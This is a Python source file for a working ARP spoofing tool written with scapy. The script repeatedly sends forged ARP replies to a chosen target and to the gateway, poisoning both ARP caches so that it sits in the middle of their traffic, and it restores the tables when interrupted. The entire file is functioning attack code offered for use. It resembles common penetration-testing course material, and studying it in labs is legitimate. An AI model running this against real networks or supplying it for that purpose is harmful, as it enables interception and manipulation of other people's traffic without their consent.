#!/usr/bin/env/python3

import scapy.all as scapy
import time
import argparse
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target_ip',
                        help='IP Address that will be spoofed ex.(10.0.2.1)')
    parser.add_argument('-g', '--gateway', dest='gateway_ip',
                        help='Gateway IP Address that will be spoofed ex.(10.0.2.1)')
    options = parser.parse_args()
    if not options.target_ip:
        # code to handle error
        parser.error(
            '[-] Please specify a Target IP Address, use --help for more information.')
    elif not options.gateway_ip:
        # code to handle error
        parser.error(
            '[-] Please specify a Gateway address to spoof, use --help for more information.')
    return options


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, gateway_ip):
    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)


def restore_network(destination_ip, source_ip):
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

try:
    sent_packets_counter = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        sent_packets_counter = sent_packets_counter + 2
        print('\r[+] Packets sent: ' + str(sent_packets_counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print(' [+] Detected CTRL + C ......... Resetting ARP Tables..... Please wait.\n')
    # print(options.target_ip, options.gateway_ip)
    restore_network(options.target_ip, options.gateway_ip)
